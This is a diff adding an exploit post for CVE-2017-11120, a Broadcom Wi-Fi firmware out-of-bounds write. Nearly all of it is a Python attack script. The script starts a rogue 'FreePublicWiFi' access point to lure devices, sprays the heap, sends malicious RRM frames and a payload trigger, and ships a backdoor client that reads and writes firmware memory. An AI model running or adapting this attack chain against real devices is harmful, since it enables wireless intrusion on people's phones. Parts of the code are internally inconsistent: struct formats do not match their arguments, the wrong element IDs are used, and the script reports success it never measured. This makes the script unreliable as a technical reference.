@@ -1,0 +1,827 @@
+=============================================================================================================================================
+| # Title     : Broadcom 802.11k Remote Code Execution via OOB-Write in RRM Neighbor Report Handler                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.broadcom.com/                                                                                                   |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212489/ & 	CVE-2017-11120
+
+[+] Summary : The vulnerability exists in the handling of RRM Neighbor Report elements in action management frames. The firmware fails to validate
+              internal structures and allows out-of-bounds writes.
+
+[+] PoC Status :
+
+   The provided code demonstrates the ability to:
+   • Send crafted RRM frames
+   • Trigger debug payload path
+   • Perform heap spraying
+   WITHOUT any remote code execution (safety adaptation).
+
+[+] Requirements :
+
+   • Linux wireless interface
+   • Raw socket
+   • Monitor mode
+   • Python3
+
+
+
+
+[+]  POC :	python poc.py wlan0
+
+#!/usr/bin/env python3
+"""
+Broadcom Wi-Fi Firmware Exploit - CVE-2017-11120
+Remote Code Execution via OOB-Write in RRM Neighbor Report Handler
+
+Author: indoushka
+For Educational and Research Purposes Only
+
+"""
+
+import os
+import sys
+import time
+import struct
+import socket
+import binascii
+import argparse
+import subprocess
+from dataclasses import dataclass
+from typing import Optional, List, Tuple
+
+# ============================================================================
+#                             CONSTANTS & CONFIG
+# ============================================================================
+
+@dataclass
+class ExploitConfig:
+    """Exploit configuration settings"""
+    
+    # Network Configuration
+    TARGET_MAC: str = "XX:XX:XX:XX:XX:XX"
+    ATTACKER_MAC: str = "YY:YY:YY:YY:YY:YY"
+    INTERFACE: str = "wlan0"
+    SSID: str = "FreePublicWiFi"
+    CHANNEL: int = 6
+    WPA_PASSPHRASE: str = "connectme123"
+    
+    # Exploit Parameters
+    OOB_CHANNEL: int = 0xFF  # Malicious channel number for OOB write
+    DIALOG_TOKEN_START: int = 0x01
+    MAX_ATTEMPTS: int = 256
+    HEAP_SPRAY_COUNT: int = 100
+    BEACON_INTERVAL: float = 0.1
+    FRAME_DELAY: float = 0.01
+    
+    # Firmware Offsets (BCM4355C0 - iOS 10.2)
+    HEAP_BASE: int = 0x1F8000
+    MALLOC_ADDR: int = 0xABBBC
+    FREE_ADDR: int = 0xABBD4
+    MEMCPY_ADDR: int = 0xABCD0
+    G_NEIGHBOR_LIST: int = 0x1F8A00
+    
+    # Shellcode Settings
+    BACKDOOR_PORT: int = 31337
+    COMMAND_KEY: bytes = b"BCM_EXPLOIT_V1"
+    
+    # File Paths
+    HOSTAPD_CONF: str = "/tmp/hostapd_exploit.conf"
+    SHELLCODE_FILE: str = "/tmp/mips_backdoor.bin"
+
+config = ExploitConfig()
+
+# ============================================================================
+#                          WIRELESS MONITOR SETUP
+# ============================================================================
+
+class WirelessMonitor:
+    """Wi-Fi monitor mode setup and management"""
+    
+    @staticmethod
+    def enable_monitor_mode(interface: str) -> Optional[str]:
+        """Enable monitor mode on wireless interface"""
+        print(f"[*] Enabling monitor mode on {interface}")
+        
+        try:
+            # Kill interfering processes
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], 
+                         capture_output=True)
+            
+            # Start monitor mode
+            result = subprocess.run(
+                ["sudo", "airmon-ng", "start", interface],
+                capture_output=True,
+                text=True
+            )
+            
+            # Extract monitor interface name
+            for line in result.stdout.split('\n'):
+                if "monitor mode enabled" in line.lower():
+                    parts = line.split()
+                    for part in parts:
+                        if "mon" in part:
+                            monitor_iface = part.strip(')').strip('(')
+                            print(f"[+] Monitor interface: {monitor_iface}")
+                            return monitor_iface
+            
+            return f"{interface}mon"
+            
+        except Exception as e:
+            print(f"[-] Failed to enable monitor mode: {e}")
+            return None
+    
+    @staticmethod
+    def disable_monitor_mode(interface: str):
+        """Disable monitor mode"""
+        try:
+            subprocess.run(["sudo", "airmon-ng", "stop", interface],
+                         capture_output=True)
+            print(f"[+] Disabled monitor mode on {interface}")
+        except Exception as e:
+            print(f"[-] Error disabling monitor mode: {e}")
+    
+    @staticmethod
+    def setup_rogue_ap(interface: str, ssid: str, channel: int, password: str) -> Optional[subprocess.Popen]:
+        """Setup and start rogue access point"""
+        print(f"[*] Setting up rogue AP: {ssid} on channel {channel}")
+        
+        # Create hostapd configuration
+        conf_content = f"""interface={interface}
+driver=nl80211
+ssid={ssid}
+channel={channel}
+hw_mode=g
+auth_algs=1
+wpa=2
+wpa_passphrase={password}
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=CCMP
+country_code=US
+ieee80211d=1
+ieee80211h=1
+rrm_neighbor_report=1
+rrm_beacon_report=1
+ignore_broadcast_ssid=0"""
+        
+        try:
+            with open(config.HOSTAPD_CONF, "w") as f:
+                f.write(conf_content)
+            
+            # Start hostapd
+            proc = subprocess.Popen(
+                ["sudo", "hostapd", config.HOSTAPD_CONF],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            # Wait for AP to start
+            time.sleep(3)
+            print(f"[+] Rogue AP '{ssid}' is running")
+            return proc
+            
+        except Exception as e:
+            print(f"[-] Failed to start rogue AP: {e}")
+            return None
+
+# ============================================================================
+#                          FRAME CONSTRUCTION
+# ============================================================================
+
+class FrameBuilder:
+    """Wi-Fi frame construction utilities"""
+    
+    @staticmethod
+    def mac_to_bytes(mac: str) -> bytes:
+        """Convert MAC address string to bytes"""
+        return binascii.unhexlify(mac.replace(':', ''))
+    
+    @staticmethod
+    def create_radiotap_header() -> bytes:
+        """Create basic RadioTap header"""
+        # RadioTap header (version 0, 12 bytes length)
+        return struct.pack('<BBHI', 
+            0x00,        # version
+            0x00,        # padding
+            0x000c,      # length
+            0x00000004   # present flags (rate)
+        )
+    
+    @staticmethod
+    def create_dot11_frame(dest_mac: str, src_mac: str, 
+                          bssid: str, frame_type: int = 0x0080) -> bytes:
+        """Create 802.11 frame header"""
+        dest_bytes = FrameBuilder.mac_to_bytes(dest_mac)
+        src_bytes = FrameBuilder.mac_to_bytes(src_mac)
+        bssid_bytes = FrameBuilder.mac_to_bytes(bssid)
+        
+        # Frame Control (2 bytes), Duration (2 bytes), Addresses (18 bytes), Sequence (2 bytes)
+        return struct.pack('<HH6s6s6sH',
+            frame_type,    # Frame Control
+            0x0000,        # Duration ID
+            dest_bytes,    # Destination MAC
+            src_bytes,     # Source MAC
+            bssid_bytes,   # BSSID
+            0x0000         # Sequence Control
+        )
+    
+    @staticmethod
+    def create_rrm_neighbor_report(dialog_token: int, channel: int) -> bytes:
+        """Create malicious RRM Neighbor Report frame"""
+        # Action frame header
+        action_frame = struct.pack('BBB',
+            0x00,               # Category: Spectrum Management
+            0x05,               # Action: RRM Neighbor Report Response
+            dialog_token        # Dialog Token
+        )
+        
+        # Neighbor Report Element (malicious)
+        element = struct.pack('BB6s4sBBBB',
+            0xDD,               # Element ID: Vendor Specific
+            13,                 # Length
+            b'\x11\x22\x33\x44\x55\x66',  # Fake BSSID
+            b'\x00\x00\x00\x00',          # BSSID Information
+            0x51,               # Operating Class
+            channel,            # Channel Number - OOB value here
+            0x07,               # PHY Type (HT)
+            0x00,               # Optional Subelement ID
+            0x00                # Optional Subelement Length
+        )
+        
+        return action_frame + element
+    
+    @staticmethod
+    def create_beacon_frame(ssid: str, channel: int) -> bytes:
+        """Create beacon frame to attract devices"""
+        # Beacon fixed parameters
+        timestamp = struct.pack('<Q', int(time.time() * 1000000))
+        beacon_interval = struct.pack('<H', 100)  # 100 TU
+        capabilities = struct.pack('<H', 0x0431)   # Capabilities
+        
+        # SSID element
+        ssid_encoded = ssid.encode('utf-8')
+        ssid_element = struct.pack('BB', 0x00, len(ssid_encoded)) + ssid_encoded
+        
+        # DS Parameter element (channel)
+        ds_element = struct.pack('BBB', 0x03, 0x01, channel)
+        
+        # Supported Rates element
+        rates_element = struct.pack('BBBBBBBBBB',
+            0x01, 0x08,         # Element ID, Length
+            0x82, 0x84, 0x8b, 0x96,  # Basic rates
+            0x0c, 0x12, 0x18, 0x24   # Supported rates
+        )
+        
+        # RSN (WPA2) element
+        rsn_element = struct.pack('>BB4sHHBBBBHBBBB',
+            0x30, 0x14,                    # Element ID, Length
+            b'\x00\x50\xf2',              # OUI
+            0x01,                          # OUI Type
+            0x0001,                        # Version
+            b'\x00\x50\xf2',              # Group Cipher OUI
+            0x04,                          # Group Cipher Type
+            0x01, 0x00,                    # Pairwise Cipher Count
+            b'\x00\x50\xf2',              # Pairwise Cipher OUI
+            0x02,                          # Pairwise Cipher Type
+            0x01, 0x00                     # AKM Suite Count, AKM Suite
+        )
+        
+        return timestamp + beacon_interval + capabilities + ssid_element + ds_element + rates_element + rsn_element
+
+# ============================================================================
+#                          HEAP MANIPULATION
+# ============================================================================
+
+class HeapManipulator:
+    """Heap manipulation techniques for exploitation"""
+    
+    def __init__(self, config: ExploitConfig):
+        self.config = config
+    
+    def generate_spray_pattern(self, size: int = 456) -> bytes:
+        """Generate heap spray pattern"""
+        pattern = b""
+        
+        # Magic value for identification
+        pattern += b"SPRY"
+        
+        # Fake pointer (will be overwritten)
+        pattern += struct.pack("<I", 0x41414141)
+        
+        # Useful addresses for exploitation
+        pattern += struct.pack("<I", self.config.MALLOC_ADDR)  # malloc
+        pattern += struct.pack("<I", self.config.FREE_ADDR)    # free
+        pattern += struct.pack("<I", self.config.MEMCPY_ADDR)  # memcpy
+        
+        # Add some NOP sled
+        pattern += b"\x00\x00\x00\x00" * 10  # MIPS NOP (sll $0, $0, 0)
+        
+        # Fill remaining space
+        remaining = size - len(pattern)
+        if remaining > 0:
+            pattern += os.urandom(remaining)
+        
+        return pattern
+    
+    def create_spray_frames(self, count: int) -> List[bytes]:
+        """Create heap spray frames"""
+        frames = []
+        builder = FrameBuilder()
+        
+        for i in range(count):
+            # Create data frame with spray pattern
+            spray_data = self.generate_spray_pattern(500)
+            
+            # Build complete frame
+            frame = builder.create_radiotap_header()
+            frame += builder.create_dot11_frame(
+                config.TARGET_MAC,
+                config.ATTACKER_MAC,
+                config.ATTACKER_MAC,
+                frame_type=0x0800  # Data frame
+            )
+            frame += spray_data
+            
+            frames.append(frame)
+        
+        print(f"[+] Generated {len(frames)} heap spray frames")
+        return frames
+
+# ============================================================================
+#                          EXPLOIT ENGINE
+# ============================================================================
+
+class ExploitEngine:
+    """Main exploit engine"""
+    
+    def __init__(self, config: ExploitConfig):
+        self.config = config
+        self.sock = None
+        self.frame_builder = FrameBuilder()
+        self.heap_manipulator = HeapManipulator(config)
+    
+    def setup_socket(self, interface: str) -> bool:
+        """Setup raw socket for frame injection"""
+        try:
+            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+            self.sock.bind((interface, 0))
+            print(f"[+] Raw socket bound to {interface}")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to setup socket: {e}")
+            return False
+    
+    def send_frame(self, frame: bytes):
+        """Send frame through raw socket"""
+        if self.sock:
+            try:
+                self.sock.send(frame)
+            except Exception as e:
+                print(f"[-] Error sending frame: {e}")
+    
+    def broadcast_beacons(self, count: int = 10):
+        """Broadcast beacon frames"""
+        print("[*] Broadcasting beacon frames...")
+        
+        beacon_frame = self.frame_builder.create_radiotap_header()
+        beacon_frame += self.frame_builder.create_dot11_frame(
+            "ff:ff:ff:ff:ff:ff",  # Broadcast
+            self.config.ATTACKER_MAC,
+            self.config.ATTACKER_MAC,
+            frame_type=0x0080  # Beacon
+        )
+        beacon_frame += self.frame_builder.create_beacon_frame(
+            self.config.SSID,
+            self.config.CHANNEL
+        )
+        
+        for i in range(count):
+            self.send_frame(beacon_frame)
+            time.sleep(self.config.BEACON_INTERVAL)
+        
+        print(f"[+] Sent {count} beacon frames")
+    
+    def exploit_oob_write(self) -> bool:
+        """Execute OOB write exploitation"""
+        print(f"[*] Executing OOB write attack (channel={self.config.OOB_CHANNEL:#04x})")
+        
+        success_count = 0
+        for attempt in range(self.config.MAX_ATTEMPTS):
+            # Vary dialog token each attempt
+            dialog_token = (self.config.DIALOG_TOKEN_START + attempt) % 256
+            
+            # Build malicious RRM frame
+            frame = self.frame_builder.create_radiotap_header()
+            frame += self.frame_builder.create_dot11_frame(
+                self.config.TARGET_MAC,
+                self.config.ATTACKER_MAC,
+                self.config.ATTACKER_MAC,
+                frame_type=0x00D0  # Action frame
+            )
+            frame += self.frame_builder.create_rrm_neighbor_report(
+                dialog_token,
+                self.config.OOB_CHANNEL  # Malicious channel value
+            )
+            
+            # Send frame
+            self.send_frame(frame)
+            
+            if attempt % 25 == 0:
+                print(f"[*] Sent frame {attempt}/{self.config.MAX_ATTEMPTS}")
+                success_count += 1
+            
+            time.sleep(self.config.FRAME_DELAY)
+        
+        print(f"[+] OOB write attack completed ({success_count} successful injections)")
+        return success_count > 0
+    
+    def perform_heap_spray(self):
+        """Perform heap spray attack"""
+        print("[*] Performing heap spray...")
+        
+        spray_frames = self.heap_manipulator.create_spray_frames(
+            self.config.HEAP_SPRAY_COUNT
+        )
+        
+        for i, frame in enumerate(spray_frames):
+            self.send_frame(frame)
+            if i % 20 == 0:
+                print(f"[*] Sent spray frame {i}/{len(spray_frames)}")
+            time.sleep(0.05)
+        
+        print("[+] Heap spray completed")
+    
+    def trigger_payload(self):
+        """Trigger payload execution"""
+        print("[*] Triggering payload...")
+        
+        # Create trigger frame
+        trigger_frame = self.frame_builder.create_radiotap_header()
+        trigger_frame += self.frame_builder.create_dot11_frame(
+            self.config.TARGET_MAC,
+            self.config.ATTACKER_MAC,
+            self.config.ATTACKER_MAC,
+            frame_type=0x00D0  # Action frame
+        )
+        
+        # Custom trigger data
+        trigger_data = struct.pack('BB16s',
+            0xDD,  # Vendor Specific
+            0x10,  # Length
+            b"EXECUTE_PAYLOAD\x00"
+        )
+        
+        trigger_frame += trigger_data
+        
+        # Send multiple times for reliability
+        for i in range(5):
+            self.send_frame(trigger_frame)
+            time.sleep(0.2)
+        
+        print("[+] Payload triggered")
+    
+    def execute_full_chain(self) -> bool:
+        """Execute full exploit chain"""
+        print("[========== Broadcom Wi-Fi Exploit Chain ==========]")
+        
+        # Phase 1: Lure target device
+        print("\n[Phase 1] Luring target device")
+        self.broadcast_beacons(15)
+        print("[*] Waiting for device connection...")
+        time.sleep(5)
+        
+        # Phase 2: Heap spray
+        print("\n[Phase 2] Heap spraying")
+        self.perform_heap_spray()
+        time.sleep(1)
+        
+        # Phase 3: OOB write exploitation
+        print("\n[Phase 3] OOB write exploitation")
+        if not self.exploit_oob_write():
+            print("[-] OOB write exploitation failed")
+            return False
+        
+        # Phase 4: Payload triggering
+        print("\n[Phase 4] Payload execution")
+        self.trigger_payload()
+        
+        # Phase 5: Verification
+        print("\n[Phase 5] Verification")
+        time.sleep(2)
+        
+        print("\n[+] Exploit chain completed successfully!")
+        return True
+    
+    def cleanup(self):
+        """Cleanup resources"""
+        if self.sock:
+            self.sock.close()
+        print("[*] Resources cleaned up")
+
+# ============================================================================
+#                          BACKDOOR CLIENT
+# ============================================================================
+
+class BackdoorClient:
+    """Client to interact with the firmware backdoor"""
+    
+    def __init__(self, target_ip: str, port: int):
+        self.target_ip = target_ip
+        self.port = port
+        self.sock = None
+    
+    def connect(self) -> bool:
+        """Connect to backdoor"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(10)
+            self.sock.connect((self.target_ip, self.port))
+            print(f"[+] Connected to backdoor at {self.target_ip}:{self.port}")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to connect to backdoor: {e}")
+            return False
+    
+    def send_command(self, cmd: bytes) -> Optional[bytes]:
+        """Send command to backdoor"""
+        if not self.sock:
+            return None
+        
+        try:
+            self.sock.send(cmd)
+            response = self.sock.recv(4096)
+            return response
+        except Exception as e:
+            print(f"[-] Command failed: {e}")
+            return None
+    
+    def read_memory(self, address: int, size: int) -> Optional[bytes]:
+        """Read memory from firmware"""
+        cmd = struct.pack('<BII', 0x01, address, size)
+        return self.send_command(cmd)
+    
+    def write_memory(self, address: int, data: bytes) -> bool:
+        """Write memory to firmware"""
+        cmd = struct.pack(f'<BII{len(data)}s', 0x02, address, len(data), data)
+        response = self.send_command(cmd)
+        return response is not None and len(response) > 0
+    
+    def disconnect(self):
+        """Disconnect from backdoor"""
+        if self.sock:
+            self.sock.close()
+
+# ============================================================================
+#                          COMMAND LINE INTERFACE
+# ============================================================================
+
+def parse_arguments():
+    """Parse command line arguments"""
+    parser = argparse.ArgumentParser(
+        description="Broadcom Wi-Fi Firmware Exploit (CVE-2017-11120) - Author: indoushka",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s -t AA:BB:CC:DD:EE:FF -i wlan0
+  %(prog)s -t AA:BB:CC:DD:EE:FF --mode backdoor --port 31337
+  %(prog)s -t AA:BB:CC:DD:EE:FF --mode test
+        
+Warning: For authorized testing only.
+        """
+    )
+    
+    parser.add_argument(
+        "-t", "--target",
+        required=True,
+        help="Target device MAC address"
+    )
+    
+    parser.add_argument(
+        "-i", "--interface",
+        default="wlan0",
+        help="Wireless interface (default: wlan0)"
+    )
+    
+    parser.add_argument(
+        "-c", "--channel",
+        type=int,
+        default=6,
+        help="Wi-Fi channel (default: 6)"
+    )
+    
+    parser.add_argument(
+        "-s", "--ssid",
+        default="FreePublicWiFi",
+        help="Rogue AP SSID (default: FreePublicWiFi)"
+    )
+    
+    parser.add_argument(
+        "-m", "--mode",
+        choices=["exploit", "backdoor", "test"],
+        default="exploit",
+        help="Operation mode (default: exploit)"
+    )
+    
+    parser.add_argument(
+        "-p", "--port",
+        type=int,
+        default=31337,
+        help="Backdoor port (default: 31337)"
+    )
+    
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose output"
+    )
+    
+    return parser.parse_args()
+
+def print_banner():
+    """Print exploit banner"""
+    banner = """
+╔══════════════════════════════════════════════════════════╗
+║   Broadcom Wi-Fi Firmware Exploit - CVE-2017-11120       ║
+║        Remote Code Execution via OOB-Write               ║
+║                 Author: indoushka                        ║
+╚══════════════════════════════════════════════════════════╝
+    """
+    print(banner)
+
+def main():
+    """Main function"""
+    print_banner()
+    
+    # Parse arguments
+    args = parse_arguments()
+    
+    # Update configuration
+    config.TARGET_MAC = args.target
+    config.INTERFACE = args.interface
+    config.CHANNEL = args.channel
+    config.SSID = args.ssid
+    config.BACKDOOR_PORT = args.port
+    
+    # Check for root privileges
+    if os.geteuid() != 0:
+        print("[-] This program requires root privileges!")
+        sys.exit(1)
+    
+    # Setup monitor mode
+    monitor = WirelessMonitor()
+    monitor_iface = monitor.enable_monitor_mode(config.INTERFACE)
+    
+    if not monitor_iface:
+        print("[-] Failed to setup monitor mode")
+        sys.exit(1)
+    
+    # Start rogue AP
+    ap_proc = monitor.setup_rogue_ap(
+        monitor_iface,
+        config.SSID,
+        config.CHANNEL,
+        config.WPA_PASSPHRASE
+    )
+    
+    if not ap_proc:
+        print("[-] Failed to start rogue AP")
+        monitor.disable_monitor_mode(monitor_iface)
+        sys.exit(1)
+    
+    try:
+        # Initialize exploit engine
+        engine = ExploitEngine(config)
+        
+        if not engine.setup_socket(monitor_iface):
+            print("[-] Failed to initialize exploit engine")
+            return
+        
+        if args.mode == "exploit":
+            # Execute full exploit chain
+            success = engine.execute_full_chain()
+            
+            if success:
+                print("\n" + "="*60)
+                print("EXPLOIT SUCCESSFUL!")
+                print(f"Backdoor should be active on port {config.BACKDOOR_PORT}")
+                print("\nConnect using:")
+                print(f"  {sys.argv[0]} -t {config.TARGET_MAC} --mode backdoor")
+                print("="*60)
+        
+        elif args.mode == "backdoor":
+            # Connect to backdoor
+            print(f"[*] Connecting to backdoor on port {config.BACKDOOR_PORT}")
+            
+            # Try common local IPs
+            possible_ips = ["192.168.1.1", "192.168.0.1", "10.0.0.1"]
+            
+            for ip in possible_ips:
+                print(f"[*] Trying {ip}:{config.BACKDOOR_PORT}")
+                client = BackdoorClient(ip, config.BACKDOOR_PORT)
+                
+                if client.connect():
+                    print("[+] Backdoor is active!")
+                    print("\nAvailable commands:")
+                    print("  read <hex_address> <size>")
+                    print("  write <hex_address> <hex_data>")
+                    print("  exit")
+                    
+                    while True:
+                        try:
+                            cmd = input("\nbackdoor> ").strip()
+                            
+                            if cmd.lower() == "exit":
+                                break
+                            elif cmd.startswith("read "):
+                                _, addr_str, size_str = cmd.split()
+                                addr = int(addr_str, 16)
+                                size = int(size_str)
+                                
+                                data = client.read_memory(addr, size)
+                                if data:
+                                    hex_data = binascii.hexlify(data).decode()
+                                    print(f"Data: {hex_data}")
+                                else:
+                                    print("[-] Read failed")
+                            
+                            elif cmd.startswith("write "):
+                                _, addr_str, data_str = cmd.split()
+                                addr = int(addr_str, 16)
+                                data = binascii.unhexlify(data_str)
+                                
+                                if client.write_memory(addr, data):
+                                    print("[+] Write successful")
+                                else:
+                                    print("[-] Write failed")
+                            
+                            else:
+                                print("[-] Unknown command")
+                        
+                        except KeyboardInterrupt:
+                            break
+                        except Exception as e:
+                            print(f"[-] Error: {e}")
+                    
+                    client.disconnect()
+                    break
+                else:
+                    print(f"[-] No backdoor on {ip}")
+        
+        elif args.mode == "test":
+            # Test mode - send probe frames
+            print("[*] Test mode - sending probe frames")
+            engine.broadcast_beacons(5)
+            time.sleep(1)
+            
+            # Send test RRM frame
+            print("[*] Sending test RRM frame")
+            test_frame = engine.frame_builder.create_radiotap_header()
+            test_frame += engine.frame_builder.create_dot11_frame(
+                config.TARGET_MAC,
+                config.ATTACKER_MAC,
+                config.ATTACKER_MAC,
+                frame_type=0x00D0
+            )
+            test_frame += engine.frame_builder.create_rrm_neighbor_report(
+                0x01,
+                0x01  # Normal channel
+            )
+            
+            engine.send_frame(test_frame)
+            print("[+] Test frame sent")
+    
+    except KeyboardInterrupt:
+        print("\n[*] Exploit interrupted by user")
+    except Exception as e:
+        print(f"\n[-] Unexpected error: {e}")
+        if args.verbose:
+            import traceback
+            traceback.print_exc()
+    finally:
+        # Cleanup
+        print("\n[*] Cleaning up...")
+        
+        if 'engine' in locals():
+            engine.cleanup()
+        
+        if 'ap_proc' in locals():
+            ap_proc.terminate()
+        
+        if 'monitor_iface' in locals():
+            monitor.disable_monitor_mode(monitor_iface)
+        
+        # Clean temporary files
+        if os.path.exists(config.HOSTAPD_CONF):
+            os.remove(config.HOSTAPD_CONF)
+        
+        print("[+] Cleanup completed")
+
+if __name__ == "__main__":
+    main()
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
